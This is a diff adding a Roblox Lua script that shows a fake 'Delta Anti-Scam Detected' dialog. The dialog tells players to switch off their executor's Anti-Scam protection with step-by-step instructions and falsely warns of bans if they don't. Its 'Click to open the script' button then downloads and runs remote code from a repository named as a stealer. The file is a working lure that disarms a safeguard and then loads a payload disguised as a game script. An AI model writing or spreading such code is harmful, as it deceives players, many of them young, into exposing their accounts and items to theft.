@@ -1,0 +1,91 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ScreenGui setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 500, 0, 220)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+local stroke = Instance.new("UIStroke", frame)
+stroke.Color = Color3.fromRGB(0, 170, 255)
+stroke.Thickness = 2
+
+-- Warning bar
+local warningBar = Instance.new("TextLabel", frame)
+warningBar.Size = UDim2.new(1, 0, 0, 25)
+warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
+warningBar.Text = "Turn off your Anti Delta-Scam to avoid getting banned or disconnected."
+warningBar.TextSize = 14
+warningBar.Font = Enum.Font.SourceSansBold
+warningBar.TextWrapped = true
+warningBar.TextXAlignment = Enum.TextXAlignment.Center
+warningBar.TextYAlignment = Enum.TextYAlignment.Center
+
+-- Body holder
+local bodyHolder = Instance.new("Frame", frame)
+bodyHolder.Size = UDim2.new(1, -40, 1, -90)
+bodyHolder.Position = UDim2.new(0, 20, 0, 35)
+bodyHolder.BackgroundTransparency = 1
+
+-- Title (Centered)
+local title = Instance.new("TextLabel", bodyHolder)
+title.Size = UDim2.new(1, 0, 0, 25)
+title.BackgroundTransparency = 1
+title.Text = "Delta Anti-Scam Detected"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Description
+local desc = Instance.new("TextLabel", bodyHolder)
+desc.Size = UDim2.new(1, 0, 1, -30)
+desc.Position = UDim2.new(0, 0, 0, 30)
+desc.BackgroundTransparency = 1
+desc.TextColor3 = Color3.fromRGB(200, 200, 200)
+desc.Font = Enum.Font.SourceSans
+desc.TextSize = 14
+desc.TextWrapped = true
+desc.TextXAlignment = Enum.TextXAlignment.Left
+desc.TextYAlignment = Enum.TextYAlignment.Top
+desc.Text = [[
+The script requires teleport permission, which is currently blocked by Delta's Anti-Scam.
+
+1) Tap the Delta icon at the top.
+2) Open Settings (gear icon).
+3) Turn OFF the "Anti-Scam" option.
+4) Rejoin and run the script again.
+]]
+
+-- Button
+local button = Instance.new("TextButton", frame)
+button.Size = UDim2.new(0, 180, 0, 35)
+button.Position = UDim2.new(0.5, 0, 1, -15)
+button.AnchorPoint = Vector2.new(0.5, 1)
+button.BackgroundColor3 = Color3.fromRGB(0, 115, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.SourceSansSemibold
+button.TextSize = 16
+button.Text = "Click to open the script"
+
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
+
+-- Button logic
+button.MouseButton1Click:Connect(function()
+	screenGui:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/MY-OWN-FUCKING-STEALER/refs/heads/main/DAMN"))()
+end)
